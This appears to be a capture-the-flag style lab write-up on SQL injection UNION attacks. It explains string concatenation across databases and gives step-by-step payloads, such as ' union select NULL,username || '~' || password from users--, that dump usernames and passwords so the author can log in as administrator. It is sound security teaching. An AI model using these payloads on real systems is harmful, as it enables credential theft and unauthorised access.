We can retrieve multiple values together within this single column by concatenating the values together. We can include a separator to let us distinguish the combined values. For example, on Oracle we could submit the input:<br>
``' UNION SELECT username || '~' || password FROM users--``<br>
The results from the query contain all the usernames and passwords, for example:

>...<br>
administrator~s3cure<br>
wiener~peter<br>
carlos~montoya<br>
...

>Different databases use different syntax to perform string concatenation.

<table border ="1">
    <tr>
        <th>Database System</th>
        <th>Concatenation Syntax</th>
    </tr>
    <tr>
        <td>Oracle</td>
        <td>'foo'||'bar'</td>
    </tr>
    <tr>
        <td>Microsoft SQL Server</td>
        <td>'foo'+'bar'</td>
    </tr>
    <tr>
        <td>PostgreSQL</td>
        <td>'foo'||'bar'</td>
    </tr>
    <tr>
        <td>MySQL</td>
        <td>'foo' 'bar'(Space between strings)</td>
    </tr>
    <tr>
        <td>MySQL(alternative)</td>
        <td>CONCAT('foo','bar')</td>
    </tr>
</table>

**<h2>Problem:</h2>**
The database contains a different table called users, with columns called username and password.

To solve the lab, perform a SQL injection UNION attack that retrieves all usernames and passwords, and use the information to log in as the administrator user.

**<h2>Solution:</h2>**
- Check for the number of columns using `` order by`` query, which gives us 2 columns.
- check for the data type of the columns using ``' union select 'a', NULL--`` query which gives error and again using ``'union select NULL,'a'--`` query so  second column contains text data type.
- We know that the **_users_** table contains username and password columns. 
- We concatenate the password and username column together in one column so remains one extra column with NULL value. ``' union select NULL,username || '~' || password from users--``
- Here ``~`` is a separator which separates the concatenated columns, we concatenated second column in this query because the first column did not contain text type data.
![alt text](/images/lab10multiplecolumn.png)